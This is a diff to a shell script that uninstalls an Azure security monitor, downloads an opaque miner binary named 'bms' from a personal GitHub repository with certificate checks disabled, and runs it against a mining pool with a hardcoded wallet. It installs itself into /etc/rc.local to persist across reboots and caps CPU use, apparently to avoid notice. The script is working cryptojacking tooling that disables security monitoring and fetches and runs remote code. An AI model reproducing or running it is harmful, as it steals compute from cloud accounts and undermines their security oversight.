@@ -7,10 +7,8 @@ sudo apt-get update -y
 sudo apt remove azsec-monitor -y
 sudo apt --fix-broken install -y
 sudo apt-get install cpulimit -y
-wget --no-check-certificate -O cpuminer-opt-linux.tar.gz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
-mkdir /root/cpuminer-opt-linux
-tar -xvf cpuminer-opt-linux.tar.gz -C /root/cpuminer-opt-linux
-chmod +x ./cpuminer-opt-linux/* 
+wget --no-check-certificate wget https://raw.githubusercontent.com/minhchau91/createproxy/main/bms
+chmod +x bms
 cores=$(nproc --all)
 #rounded_cores=$((cores * 9 / 10))
 #read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
@@ -19,12 +17,12 @@ limitCPU=$((cores * 80))
 cat /dev/null > /root/danielchau.sh
 cat >>/root/danielchau.sh <<EOF
 #!/bin/bash
-sudo /root/cpuminer-opt-linux/cpuminer-sse2 --background --threads=$cores -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.Azure
+./bms --background -a yespower --pool stratum+tcps://stratum-eu.rplant.xyz:17079 --tls false --wallet v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.Azure --cpu-threads $cores --disable-gpu
 sleep 3
 EOF
 chmod +x /root/danielchau.sh
 
-sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof cpuminer-sse2) > /dev/null 2>&1 &" danielchau.sh
+sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof bms) > /dev/null 2>&1 &" danielchau.sh
 
 cat /dev/null > /etc/rc.local
 cp /root/danielchau.sh /etc/rc.local
